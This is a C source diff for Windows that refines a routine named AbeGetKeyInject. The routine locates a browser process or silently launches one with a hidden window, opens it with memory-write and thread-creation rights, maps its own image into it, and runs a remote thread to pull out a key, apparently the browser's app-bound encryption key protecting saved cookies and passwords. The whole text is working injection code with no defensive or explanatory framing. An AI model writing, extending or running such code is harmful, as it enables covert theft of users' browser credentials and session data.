@@ -2,7 +2,7 @@
 
 static ULONG
 AbeFindProcessIdByName(
-    _In_z_ PCWSTR Name)
+    _In_ PCWSTR Name)
 {
     UNICODE_STRING Target;
     PSYSTEM_PROCESS_INFORMATION Entry;
@@ -23,7 +23,10 @@ AbeFindProcessIdByName(
             Pid = (ULONG)(ULONG_PTR)Entry->UniqueProcessId;
             break;
         }
-        if (Entry->NextEntryOffset == 0) break;
+        if (Entry->NextEntryOffset == 0)
+        {
+            break;
+        }
         Entry = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)Entry + Entry->NextEntryOffset);
     }
     Sys_FreeInfo(Info);
@@ -32,93 +35,151 @@ AbeFindProcessIdByName(
 
 /*** method: Inject (target the running browser process, launch it if needed) ***/
 
+_Success_(return != FALSE)
 BOOL
 AbeGetKeyInject(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
 {
     PVOID Self = (PVOID)&__ImageBase;
     PVOID Mapped = NULL;
     HANDLE Process = NULL, Thread = NULL;
+    HANDLE LaunchedProcess = NULL;
     SIZE_T RegionSize = 0;
     LONG Code = (LONG)E_FAIL;
-    ULONG Pid, Polls;
+    ULONG Pid, Polls, LaunchedPid = 0;
     NTSTATUS Status;
+    W32ERROR Error;
+    ULONGLONG Step;
+    BOOL Ok;
 
-    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;
+    Step = AbeStepStart();
+    Ok = AbePrepareRequest(Browser);
+    AbeLogStepBool(L"Inject", L"prepare request", Ok, Step);
+    if (!Ok)
+    {
+        return FALSE;
+    }
 
+    Step = AbeStepStart();
     Pid = AbeFindProcessIdByName(Browser->ExeName);
+    AbeLog(L"Inject: find running browser: %ls, pid=%lu (%I64ums)\r\n",
+           Pid != 0 ? L"OK" : L"not found",
+           Pid,
+           AbeStepMs(Step));
     if (Pid == 0)
     {
         /* not running: launch it so we have a live process to inject into */
-        STARTUPINFOW Si;
         PROCESS_INFORMATION Pi;
 
-        RtlZeroMemory(&Si, sizeof(Si));
-        RtlZeroMemory(&Pi, sizeof(Pi));
-        Si.cb = sizeof(Si);
-        if (!CreateProcessInternalW(NULL,
-                                    Browser->ExePath,
-                                    NULL,
-                                    NULL,
-                                    NULL,
-                                    FALSE,
-                                    0,
-                                    NULL,
-                                    NULL,
-                                    &Si,
-                                    &Pi,
-                                    NULL))
+        Step = AbeStepStart();
+        Ok = AbeCreateBrowserProcessEx(Browser->ExePath,
+                                       L"--no-startup-window",
+                                       0,
+                                       SW_HIDE,
+                                       &Pi);
+        Error = Ok ? ERROR_SUCCESS : Err_GetLastError();
+        AbeLogStepWin32(L"Inject", L"launch hidden browser", Error, Step);
+        if (!Ok)
         {
-            AbeLog(L"Inject: failed to create browser process, gle=%lu\r\n", Err_GetLastError());
             return FALSE;
         }
+        LaunchedProcess = Pi.hProcess;
+        LaunchedPid = Pi.dwProcessId;
+        Pid = LaunchedPid;
         NtClose(Pi.hThread);
-        NtClose(Pi.hProcess);
+        Step = AbeStepStart();
         for (Polls = 0; Polls < 50; Polls++)
         {
-            Pid = AbeFindProcessIdByName(Browser->ExeName);
-            if (Pid != 0) break;
+            ULONG FoundPid = AbeFindProcessIdByName(Browser->ExeName);
+
+            if (FoundPid != 0)
+            {
+                Pid = FoundPid;
+                break;
+            }
             PS_DelayExec(200);
         }
-        AbeLog(L"Inject: launched %ls (pid=%lu)\r\n", Browser->ExeName, Pid);
+        AbeLog(L"Inject: locate launched browser: %ls, pid=%lu (%I64ums)\r\n",
+               Pid != 0 ? L"OK" : L"failed",
+               Pid,
+               AbeStepMs(Step));
     }
     if (Pid == 0)
     {
         AbeLog(L"Inject: no running %ls found\r\n", Browser->ExeName);
         return FALSE;
     }
+    Step = AbeStepStart();
     Status = PS_OpenProcess(&Process,
                             PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                             PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                             PROCESS_VM_READ,
                             Pid);
+    AbeLogStepNt(L"Inject", L"open target process", Status, Step);
     if (!NT_SUCCESS(Status))
     {
-        AbeLog(L"Inject: OpenProcess(%lu) failed, 0x%08lX\r\n", Pid, Status);
+        if (LaunchedProcess != NULL)
+        {
+            NtTerminateProcess(LaunchedProcess, 0);
+            NtWaitForSingleObject(LaunchedProcess, FALSE, NULL);
+            NtClose(LaunchedProcess);
+        }
         return FALSE;
     }
 
-    if (AbeMapSelf(Process, &Mapped) &&
-        NT_SUCCESS(PS_CreateThread(Process,
-                                   FALSE,
-                                   (PUSER_THREAD_START_ROUTINE)((PBYTE)Mapped +
-                                       ((ULONG64)(ULONG_PTR)AbeInjectEntry - (ULONG64)(ULONG_PTR)Self)),
-                                   NULL,
-                                   &Thread,
-                                   NULL)))
+    Step = AbeStepStart();
+    Status = AbeMapSelf(Process, &Mapped);
+    AbeLogStepNt(L"Inject", L"map payload image", Status, Step);
+    if (NT_SUCCESS(Status))
     {
-        Code = AbeWaitRemoteResult(Process, Thread, Mapped, Self, Key);
-    }
-    if (Code != 0)
-    {
-        AbeLog(L"Inject: payload failed, hr=0x%08lX\r\n", (unsigned long)Code);
+        Step = AbeStepStart();
+        Status = PS_CreateThread(Process,
+                                 FALSE,
+                                 (PUSER_THREAD_START_ROUTINE)((PBYTE)Mapped +
+                                     ((ULONG_PTR)AbeInjectEntry - (ULONG_PTR)Self)),
+                                 NULL,
+                                 &Thread,
+                                 NULL);
+        AbeLogStepNt(L"Inject", L"create remote thread", Status, Step);
+        if (NT_SUCCESS(Status))
+        {
+            Step = AbeStepStart();
+            Code = AbeWaitRemoteResult(Process, Thread, Mapped, Self, Key);
+            AbeLogStepHr(L"Inject", L"wait payload result", (HRESULT)Code, Step);
+        }
     }
 
     /* do NOT terminate the user's browser; the remote thread exits on its own */
-    if (Thread != NULL) NtClose(Thread);
-    if (Mapped != NULL) NtFreeVirtualMemory(Process, &Mapped, &RegionSize, MEM_RELEASE);
-    NtClose(Process);
+    if (Thread != NULL)
+    {
+        NtClose(Thread);
+    }
+    if (Mapped != NULL)
+    {
+        NtFreeVirtualMemory(Process, &Mapped, &RegionSize, MEM_RELEASE);
+    }
+    if (LaunchedProcess != NULL)
+    {
+        if (Process != NULL)
+        {
+            Step = AbeStepStart();
+            Status = NtTerminateProcess(Process, 0);
+            AbeLogStepNt(L"Inject", L"terminate injected browser", Status, Step);
+            NtWaitForSingleObject(Process, FALSE, NULL);
+        }
+        if (LaunchedPid != 0 && LaunchedPid != Pid)
+        {
+            Step = AbeStepStart();
+            Status = NtTerminateProcess(LaunchedProcess, 0);
+            AbeLogStepNt(L"Inject", L"terminate launcher process", Status, Step);
+            NtWaitForSingleObject(LaunchedProcess, FALSE, NULL);
+        }
+        NtClose(LaunchedProcess);
+    }
+    if (Process != NULL)
+    {
+        NtClose(Process);
+    }
     return Code == 0;
 }
